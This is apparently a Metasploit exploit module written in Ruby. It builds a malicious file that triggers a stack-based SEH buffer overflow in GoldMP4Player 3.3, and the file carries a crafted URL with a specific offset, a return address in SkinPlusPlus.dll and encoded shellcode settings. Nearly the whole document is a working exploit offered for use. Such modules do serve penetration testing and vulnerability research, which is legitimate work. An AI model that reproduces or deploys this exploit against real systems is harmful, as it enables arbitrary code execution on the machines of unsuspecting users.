##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GoldMP4Player URL Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow vulnerability in
        GoldMP4Player 3.3, caused by improper bounds checking of an URL.
        By persuading the victim to open a specially-crafted URL to a Flash
        file, a remote attacker could execute arbitrary code on the system or
        cause the application to crash. This module has been tested successfully
        on Windows XP SP3 and Windows 7 SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Gabor Seljan'  # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'BID', '65855' ],
          [ 'EDB', '31914' ],
          [ 'EDB', '31972' ],
          [ 'OSVDB', '103826' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process',
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'       => "\x00\x0a\x0d\x20",
          'Space'          => 1024,
          'PrependEncoder' => "\x59\x59\x59\x59\x5C\x59\x59\x59\x59\x59\x89\xE1",
          'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
          'EncoderOptions' =>
            {
              'BufferRegister' => 'ECX'
            },
        },
      'Targets'        =>
        [
          [ 'Windows XP SP3 / Windows 7 SP1',
            {
              'Offset' => 253,
              'Ret'    => 0x10104544  # POP EBP # POP EBX # RETN [SkinPlusPlus.dll]
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Feb 27 2014',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ false, 'The file name.', 'msf.txt'])
        ],
      self.class)

  end

  def exploit

    sploit =  rand_text_alpha(target['Offset'])
    sploit << generate_seh_payload(target.ret)

    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create("http://#{sploit}.swf")

  end
end

